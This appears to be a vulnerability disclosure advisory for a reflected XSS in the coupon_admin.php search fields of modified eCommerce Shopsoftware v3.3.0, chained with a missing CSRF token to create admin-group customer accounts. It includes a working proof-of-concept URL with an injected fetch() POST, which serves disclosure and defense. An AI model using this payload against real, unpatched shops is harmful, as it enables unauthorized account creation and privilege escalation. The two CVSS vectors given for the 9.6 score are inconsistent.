# Security Advisory — Reflected XSS to Admin Account Creation (CSRF) in modified eCommerce Shopsoftware

- **ID:** CVE-2026-NNNNN (pending)
- **Published:** 10/11/2026
- **Updated:** 10/11/2026
- **Severity:** Critical
- **CVSS:** 9.6 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
- **CWE:** CWE-79 (XSS) + CWE-352 (CSRF) + CWE-269 (Privilege Escalation)
- **Status:** No official fix available
---
## 1. Executive Summary

A **Reflected Cross-Site Scripting (XSS)** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware v3.3.0**, in the coupon search module (`coupon_admin.php`), allowing arbitrary HTML/JavaScript reflected in the server response to be injected.

Because the customer creation form (`create_account.php`) **does not have an anti-CSRF token**, the chained exploitation of the two flaws allows an attacker to execute **arbitrary administrative actions** (such as creating customer records) on behalf of an authenticated administrator, simply by having the victim click a single malicious link.

---
## 2. Affected Products

>| Product / Component | Affected Version | Fixed Version | Status |
>| --- | --- | --- | --- |
>| modified eCommerce Shopsoftware | v3.3.0 rev 16825 (29/01/2026) | N/A | Affected |
>| CWE | 79, 269,  352 |  |  |
---
## 3. Vulnerability Description

The vulnerability exists due to the **direct reflection of GET parameters in the response HTML**, without the use of `htmlspecialchars()` or equivalent attribute encoding.

The **`input_id`**, **`input_code`** and **`input_name`** fields of the search form in `coupon_admin.php` fail to **validate and sanitize** the received value, allowing a value containing `"><script>` to close the `value=""` attribute of the `<input>` and inject new HTML/JavaScript, interpreted by the browser.

In addition, the **`create_account.php?action=edit`** endpoint (POST) does not implement any anti-CSRF token, accepting any authenticated request as legitimate, which allows the JavaScript injected via XSS to trigger administrative actions on behalf of the victim.

### Requirements

- Authentication required **only for the victim** (administrator already logged in) — the attacker does not need credentials
- Remote access to the application
- Knowledge of the vulnerable endpoint (`/admin/coupon_admin.php`)
- **User interaction required** (the victim must click the malicious link)
---
## 4. Impact
Exploitation allows:

- Execution of arbitrary JavaScript in the context of the administrative panel
- Making authenticated requests on behalf of the victim via `fetch`/`XMLHttpRequest` (session riding), even with an `HttpOnly` cookie
- Creation of arbitrary customer records without the administrator's consent
- Potential privilege escalation by assigning the `status=0` group ("Admin")
- Defacement of the page in the victim's browser
- Compromise of the integrity of administrative data
---
## 5. Classification

### CVSS

- **Score:** 9.6
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N`

*Individual scores of the chain components:*

>- **Reflected XSS** (`input_id`/`input_code`/`input_name`): **6.1** (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
>- **Absence of CSRF alone** (`create_account.php`): **6.5** (Medium) — `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`
>- **Privilege escalation** (`create_account.php`field `status=0`group Admin): **9.6** (Critical) — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`

### CWE

- **CWE-79** — Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **CWE-352** — Cross-Site Request Forgery (CSRF)
- **CWE-269** — Improper Privilege Management

### CAPEC

- **CAPEC-63** — Cross-Site Scripting (XSS)
- **CAPEC-62** — Cross Site Request Forgery
- **CAPEC-233** — Privilege Escalation
---
## 6. Exploitation Scenario

1. Attacker crafts a malicious URL against `coupon_admin.php`, injecting `"><script>` into one of the search parameters
2. The embedded script makes a `fetch()` POST to `/admin/create_account.php?action=edit` with `credentials:'include'`
3. Attacker sends the URL to the victim (authenticated administrator) via phishing/social engineering
4. Victim clicks the link while logged in to the panel
5. The victim's browser executes the injected script and automatically attaches the session cookie to the request
6. The server processes the request as legitimate (without a CSRF token to validate)
7. Administrative record is created/modified without the victim's knowledge or consent
---
## 7. Technical Evidence

### Affected Component

```
Endpoint: /admin/coupon_admin.php
Parâmetros: input_id, input_code, input_name (GET)
Método: GET

Endpoint: /admin/create_account.php?action=edit
Parâmetros: customers_firstname, customers_lastname, customers_email_address,
            entry_street_address, entry_postcode, entry_city, entry_country_id,
            customers_telephone, status, customers_mail (POST)
Método: POST
```

**Root cause of XSS:** absence of `htmlspecialchars()` (or equivalent) before inserting the parameter value into the `value=""` attribute of the search field.

**Root cause of CSRF:** absence of any token field (`security_token`, `formid`, nonce) in the `create_account.php` form.
---
## 8. Dependencies

Pre-provisioned laboratory environment, accessible via the local network:

```
Target: http://192.168.22.132:8080/admin/coupon_admin.php
Software: modified eCommerce Shopsoftware v3.3.0 rev 16825 (29/01/2026)
```
- Browser authenticated as administrator in the panel (`/admin/`)
- No additional software dependency to reproduce; the PoC runs entirely in the browser via URL
---
## 9. PoC

### How to use
---
http://192.168.22.132:8080/admin/coupon_admin.php

![Site with Admin login](images/01.jpg)

payload used for XSS testing

```
"><script>alert(document.domain)</script>
```

payload used for XSS testing. In the fields (`input_id`(cID) /`input_code`(Code) /`input_name`(Name))

Script injection

![Script injection](images/02.jpg)

Script result

![Script result](images/03.jpg)

payload used for CSRF + Privilege Escalation testing

```
http://192.168.22.132:8080/admin/coupon_admin.php?status=Y&input_id=&input_code="><script> fetch('/admin/create_account.php?action=edit',{ method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'default_address_id=&csID=&customers_firstname=jrhateen&customers_lastname=Pentest&customers_email_address=XSSPOC@jrhateen.local&entry_street_address=Rua+Teste+123&entry_postcode=00000000&entry_city=Teste&entry_country_id=30&customers_telephone=00000000000&status=0&customers_mail=no' }) </script>&input_name=&btnSearch=Suchen
```

Script injection

![Script injection](images/04.jpg)

CSRF + Privilege Escalation script result

![Script result](images/05.jpg)

Confirmed by direct query in `customers.php` after payload execution; the record appeared in the listing, proving the actual creation of the data via the XSS + CSRF chain.

![Script verification](images/06.jpg)

## 10. Credits

***RedScan Research Team***

***Lead Researcher:*** 
>***Carlos Tuma***
>|[Linkedin](https://www.linkedin.com/in/carlos-tuma/)|
>| --- |
>[Github](https://github.com/carlosalbertotuma)|


### Contributors:

>***Smith Braz***
>|[Linkedin](https://www.linkedin.com/in/smith-braz/)|
>| --- |
>[Github](https://github.com/smithbraz)

>***Jaconias***
>|[Linkedin](https://www.linkedin.com/in/jaconias-rocha-x64/)|
>| --- |
>[Github](https://github.com/JaconiasDev)

---
***Author: Edson Luiz da Silva Junior***
